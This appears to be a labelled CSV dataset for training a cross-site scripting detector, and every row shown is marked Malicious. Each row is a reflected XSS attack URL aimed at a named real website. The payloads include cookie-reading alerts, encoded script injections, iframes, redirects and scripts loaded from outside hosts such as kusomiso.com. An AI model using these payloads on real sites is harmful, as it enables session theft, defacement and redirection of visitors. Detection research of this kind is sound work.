Payloads,Class
http://web.dbnet.ntua.gr/core/portal.asp?cpage=login&amp;cnode=4&amp;clang=1&amp;url=&quot;&gt;&lt;script&gt;alert('cyber')&lt;/s<br>cript&gt;,Malicious
http://www.gametrailers.com/e32k6.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74<br>%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%<br>31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%3<br>1%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.agfa.com/en/co/forms/search.jsp?searched=1&amp;andterm=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e<br>%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e,Malicious
http://www.farmindustria.it/farmindustria/html/publisher_list.asp?title=&lt;script&gt;alert(&quot;scriptorium(t<br>urkey)&quot;)&lt;/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.cyberbeni.com/search/search.php?page=0&amp;query=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscri<br>pt%3e,Malicious
http://www.anbr.ru/search.php?search=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;x=1<br>6&amp;y=10,Malicious
http://www.serverspy.net/site/stats/mods.html?g=0%22%3e%3cscript%3ealert(%22kefka%20was%20here%22)%3<br>c/script%3e,Malicious
http://search.17173.com/pic.jsp?keyword=&quot;&gt;&lt;font+size=55+color=red&gt;ananizi+siktim&lt;/font&gt;&lt;script&gt;alert<br>(/sikildiniz/)&lt;/script&gt;,Malicious
http://www.macosxhints.com/search.php?query=sleepwatcher&amp;keytype=all&amp;datestart=&amp;dateend=&amp;topic=0&amp;typ<br>e=stories&amp;author=&amp;mode=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/ma<br>rquee&gt;,Malicious
"http://www.speakingtree.in/peoples.php?keyword=""/><script>alert(""xss:vijayendra"")</script>&search_type=all&x=0&y=0",Malicious
http://pti.regione.sicilia.it/portal/page/portal/pir_portale/pir_lastrutturaregionale/pir_assessoratoregionaledellerisorseagricoleealimentari/pir_dipintstrutturali/pir_dipintstrutturali_news?_piref857_7105408_857_4739684_4739684.strutsaction=/thematicnews.do&month=10&stepthematicnews=month_news&thematicfilter=%22%20%3cscript%20src=http://ha.ckers.org/xss.js%3e%3c/script%3e&year=2008,Malicious
http://www.aecinfo.com/dyn/pdc/search/search.jsp?site=1&amp;domains=www.aecinfo.com&amp;manual_submit=true&amp;s<br>itesearch=www.aecinfo.com&amp;client=pub-5231737647953648&amp;forid=1&amp;channel=4115479440&amp;ie=iso-8859-1&amp;oe=is<br>o-8859-1&amp;safe=active&amp;flav=0000&amp;sig=xzhbbqkxyrjptai8&amp;cof=galt%3a%23000000%3bgl%3a1%3bdiv%3a%23082862%<br>3bvlc%3a000000%3bah%3acenter%3bbgc%3affffff%3blbgc%3affffff%3balc%3a000000%3blc%3a000000%3bt%3a00000<br>0%3bgfnt%3a000000%3bgimp%3a000000%3bforid%3a11&amp;hl=en&amp;type=all&amp;q=&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
"http://www.bankinginfo.com.my/10_search/search.php?intpreflangid=1&amp;strquery=alert(string.fromcharcod<br>e(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%2<br>2;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcha<br>rcode(88,83,83))%3c/script%3e&amp;strmatch=all&amp;arrlangs%5b%5d=&amp;arrsites%5b%5d=&amp;strsearchlocation=2221&amp;st<br>rtype=&amp;intresultsperpage=10&amp;intpageno=0&amp;straction=save",Malicious
http://www.nda.agric.za/publications/publications.asp?category=info+pak%3cscript%3ealert(1337)%3c/sc<br>ript%3e,Malicious
"http://www.clickajob.co.uk/cgi-bin/user.cgi?module=vacancy_search&amp;task=search_results&amp;keywords=';ale<br>rt(string.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcha<br>rcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3<br>ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://ceres.0rn.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.<br>com%22)%3c/script%3e,Malicious
http://www.minefe.gouv.fr/recherche/lance_recherche.php?mot=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2<br>fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;search_go=ok,Malicious
http://haber.ok.net/sorgula.html?sorgula=true&anahtar=%22%3e%3c/title%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.manskligarattigheter.gov.se/extra/pod/?id=53&amp;module_instance=3&amp;action=pod_show&amp;navid=--%3<br>e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://hac.kers.us/search_result.php?search_id=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e,Malicious
http://www.dieselhaulin.com/forums/introduce-yourself/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee<br>&gt;,Malicious
http://hotel.ti-da.net/search.php?search='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/sc<br>ript%3e,Malicious
http://www.avg.com.au/resources/-%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e-/,Malicious
http://propaganda.netdiscounter.de/shop/cgi-bin/artikel.asp?gruppe1=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.gomylocal.com/newsletter_signup.php?email=%22%3e%3cscript%3ealert(/xssed/)%3c/script%3e,Malicious
http://www.waterfrontoronto.ca/dynamic.php?first=43fa75b221b08&amp;second=46488956639c1&quot;&gt;&lt;script&gt;alert(d<br>ocument.cookie)&lt;/script&gt;,Malicious
http://tube.aeiou.pt/?s=%3e%22%3e%3ciframe+src%3d%22http%3a%2f%2fxssed.com%22%3e,Malicious
http://www.botego.com/index.php?sessid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;pes+ba<br>ckdoor+ne+olur+evlen+benimle&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bertali.com/yaridag/yaridag/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sernam.gov.cl/publico/buscador.php?cadena=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.msgpluslive.net/scripts/search/?q=%3c%2ftitle%3e%3cscript%3ealert%28/totalschaden/%29%3c%<br>2fscript%3e,Malicious
http://www.warwickref.com/igallery33/login.asp?folder=referees&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms131.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
"http://guide-envies.femmes.fr.msn.com/produit_type.php?id=441&rub=""><script>alert(document.cookie)</script>",Malicious
http://www.fujixerox.co.nz/content/search.html?quick=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e,Malicious
http://www.mude.com.br/mude/buscaproduto.do?method=buscarapidaproduto&amp;partnumberoudescricao=%3cscrip<br>t%3ealert%28%22fzero%20rulez!%22%29%3c/script%3e&amp;_rnd=82814022417,Malicious
http://channels.isp.netscape.com/weather/c_select.jsp?pers=y&amp;where=%22%3e'%3e%3cscript%3ealert(%22x%<br>22)%3c/script%3e,Malicious
http://www.rolandgarros.com/search/cmrolg-even/search.jsp?lang=en&amp;eventid=rg&amp;loc=en_fr%22%3e%3cifram<br>e%20src=%22http://www.xssed.com%22%3e&amp;query=%22%3e%3ciframe%20src=%22http://www.xssed.com%22%3e,Malicious
http://www.tomfoolscheme.com/webcards/upload/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
"http://www.faith-go.co.jp/lists/viewitem_outlet.asp?cid=00322&amp;fl=1,2%22%3e'%3e%3c/script%3e%3cscript<br>/src=http://kusomiso.com/xss.js%3e%3c/script%3e,3,10&amp;hid=&amp;list=new&amp;id=s00000000019530",Malicious
http://www.bravo.ca/connect/includes/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/thi<br>rdparty/scripts/hotpockets.js%3e,Malicious
http://www.providerschoice.com//site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vul<br>n%27%29%3c%2fscript%3e,Malicious
http://www.aliraif.com.tr/hakkimizda.asp?baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://ingamemanuals.software.eu.playstation.com/adhocparty/manual.php?locale=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)<br>&lt;/script&gt;&lt;script+src=http://z.l.to&gt;&lt;/script&gt;&lt;plaintext&gt;,Malicious
http://www.taoqu.net/search.asp?w='%22--%3e%3cscript%3ealert(/w0ot/)%3c/script%3e,Malicious
http://subonline.subdere.gov.cl/presentacion/comuna.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29<br>;%3c/script%3e,Malicious
http://archnet.org/library/documents/documents.jsp?keyword=historical+architecture%27%22%3e%3c/title<br>%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://music.msn.co.kr/music/album/album_detail.html?album_uid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://aikido-nuernberg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.voligoma.com.ar/?accion=trivia&amp;categoria=%27%3balert%28string.fromcharcode%2888%2c83%2c83<br>%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.from<br>charcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--<br>%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscri<br>pt%3e%3d%26%7b%7d%22%3e%3cscript+src%3dhttp%3a%2f%2fckers.org%2fs%3e&amp;x=37&amp;y=8&amp;seccion=trivia,Malicious
http://lawcrawler.findlaw.com/scripts/lc.pl?country=&amp;start=195&amp;lang=&amp;entry=missouri+adoption&amp;sites='<br>'&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://member1.taobao.com/member/login.jhtml?redirect_url=%3c%22%3c%3cscript%3ealert(document.cookie<br>)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(doc<br>ument.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript<br>%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.thainavigation.com/longstay_top.php?longstay_id=1'%3e%22%3e%3ciframe%20src=http://kusomis<br>o.com/xss.html%20%3c,Malicious
http://www.cmd.gov.ar/buscador/?buscar=%22%3e%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.e-culture.gov.gr/error.asp?errormessage=%3cscript%3ealert%28string.fromcharcode%2883%2c11<br>6%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c<br>%2fh1%3e%3c%2fmarquee%3e,Malicious
https://secured.alapage.com/-/amaformidentification/?donnee_appel=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious
http://www.bloombergutv.com/search.php?tag=%27%27%22%3e%3c/title%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
http://www.greatvaluegifts.com/?action=search&amp;q=%3ciframe%20src=javascript:alert(123)%3e&amp;go=search!,Malicious
http://www.shopbrita.com/zoom.asp?edpz=334156%22%3e%3cscript%3ealert(%22mcafee%20secure!\ntested%20d<br>aily%22)%3c/script%3e,Malicious
http://resistancecomp.software.eu.playstation.com/country_select.php?locale=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert<br>(&quot;xss&quot;)&lt;/script&gt;&lt;script+src=http://z.l.to&gt;&lt;/script&gt;&lt;plaintext&gt;,Malicious
http://www1.smsd.org/cipa/default_.cfm?url=http://67.52.216.216/&amp;reason=anonymizer/'%3e%22%3e%3cscri<br>pt/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.comercioexterior.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/scr<br>ipt%3e,Malicious
http://nieuws.auto.nl.msn.com/autovergelijker.php?merk=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20rohit%3c/h1%3e%3c/marquee%3e&model=a2&jaar=0&cache=no,Malicious
http://english.huaian.gov.cn/%3cscript%3ealert(%22xssed%20by%20prashant%22)%3c/script%3e.do,Malicious
http://srs.dna.affrc.go.jp/srs8//srs?page=loaderinfo&amp;loadername=%3c/script%3e%3cscript%3ealert(12345<br>678987654321)%3c/script%3e,Malicious
http://www.almeirim.pt/catalogo/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;searcht<br>xt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://lauhakan.home.cern.ch/lauhakan/searchbooks.asp?q=%22%3e%3cscript%3ealert('seymen')%3c/script%<br>3e,Malicious
http://www.nytimes.com/2007/09/16/automobiles/16miles.html?_r=1&amp;ex=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&amp;oref=slogin,Malicious
http://www.hotspringsfsbos.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms110.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://us-sms.sina.com/feedback.php?totalnum=528%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%7<br>3%63%72%69%70%74%3e%0a&amp;pagenum=66,Malicious
http://boston.bizjournals.com/boston/othercities/louisville/stories/2007/07/16/tidbits4.html?jst=&quot;&gt;&lt;<br>script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious
http://www.because.tv/news/news.php?mn=1&amp;mx=10&amp;dv=10%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e,Malicious
http://www.jart.at/jart/prj3/creativespace/website.jart?rel=de&amp;reserve-mode=active&amp;content-id=119135<br>4857766&amp;news_id=1219235437272&amp;start=0%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.cvrnetwork.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://eltel.net/news/announcements/?id=%3cscript%3ealert('the_miller')%3c/script%3e,Malicious
http://www1.aiatsis.gov.au/dawnsearch/find.asp?searchstring=error%22%3e%3cscript+language%3djavascri<br>pt%3ealert%28document.cookie%29%3b%3c%2fscript%3e,Malicious
http://fleshbot.com/search/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e<br>%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e/,Malicious
http://www.cs.deu.edu.tr/index.php?option=com_remository&amp;itemid=105&amp;func=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://www.hummingbird.com/search/search.html?searchtext=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3<br>c%2fscript%3e&amp;searchtype=basic&amp;search.x=0&amp;search.y=0&amp;search=search&amp;cks=y,Malicious
http://newsforums.bbc.co.uk/nol/thread.jspa?forumid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%20by%<br>20trex&lt;/h1&gt;,Malicious
https://www.cypack.com/member_login.html?url=/'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%<br>3c/script%3e,Malicious
http://sohbet.mynet.com/popuproom/rooms.asp?group=%22%3e%3ch1%3ehacked%20by%20st@rext%3c/h1%3e%3cscr<br>ipt%3ealert(%22by%20st@rext%20your%20site%20xss%20cookie%20play%20own%20by%20starext%22)%3c/script%3<br>e%3cscript%3ealert(document.cookie)%3c/script%3e%3cmeta%20http-equiv=%22refresh%22%20content=%221;%2<br>0url=http://lht.by.ru/uyar1.html%22%3e,Malicious
http://www.webaslan.com/forum/search.php?cat=%22%3e%3cscript%3ealert(/xss/)&lt;/script&gt;,Malicious
http://www.plunkstowing.com/i-gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://turk.internet.com/abone/login.php?l=2&amp;location=%27%29%22%29%27%22%3e%3c%2f%73%63%72%69%70%74%<br>3e%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%68%61%2e%63%6b%65%72%73%2e%6f%72%67%2f%7<br>3%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e,Malicious
http://de.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.cstone.idv.tw/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.tevapharm.com/_search/search.asp?zoom_query=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dal<br>ert%3ba(b(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylito<br>l%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=7&amp;y=10,Malicious
http://zonealarm.com/store/content/home.jsp?dc=34std&amp;ctry=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c<br>%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%<br>2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%3<br>4%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;lang=ja,Malicious
http://www.projusticia.org.pe/site.php?plantilla=busqueda&amp;txt_filtro=%3cscript%3ealert%28document.co<br>okie%29%3b%3c%2fscript%3e,Malicious
http://www.cam.nhs.uk/cgi-bin/koha/opac-search.pl?q=callnum:wb%20925%20mil%20whm%20%20|%20wb%20925%2<br>0mil%20whm%20%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e<br>xss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.gamefly.com/products/search.asp?pf='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cm<br>arquee%3ewhitehat%20forever%3c/marque%3e&amp;s='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarq<br>uee%3ewhitehat%20forever%3c/marque%3e&amp;cat='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarqu<br>ee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://fr.bigpoint.com/search/412815/?search=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3c/h<br>1%3e%3c/marquee%3e,Malicious
http://cbs.resultspage.com/search?p=q&amp;srid=s10-3&amp;ts=custom&amp;lbc=cbs&amp;uid=289674918&amp;w=%27;%3c/script%3e<br>%3cscript%3ealert(document.cookie);//,Malicious
http://area51-igc.com/igallery31/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.luckyleahys.com/photogallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kinkom.by/search.php?cat=&amp;query=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.freebsd.org/cgi/ports.cgi?query=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;stype=all&amp;sektion=all,Malicious
http://search.lycos.com/?query=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,Malicious
http://3388br.com/product_info.php?cpath=27&amp;products_id=74'%3e%22%3e%3cscript/src=http://kusomiso.co<br>m/xss.js%3e%3c/script%3e,Malicious
http://mikropc.net/kolumni/index.jsp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ircdepo.com/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious
http://a.locoboard.net/pass.php?mode=pass&amp;id=&amp;mail='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.j<br>s%3e%3c/script%3e,Malicious
http://www.musictoday.com/login.asp?stroriginalurl=%22%22%3e%3e%3c%3c/script%3e%3cimg%20%22%22%22%3e<br>%3cscript%3ealert(/xss/)%3c/script%3e%22%3e%3e%3c%3cbody%20onload=prompt(document.domain)%3e&amp;strrefe<br>rringurl=&amp;strformaction=submit&amp;stremail=&amp;strpassword=&amp;x=31&amp;y=20,Malicious
http://www.easterjvs.com/members.php?id=95%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
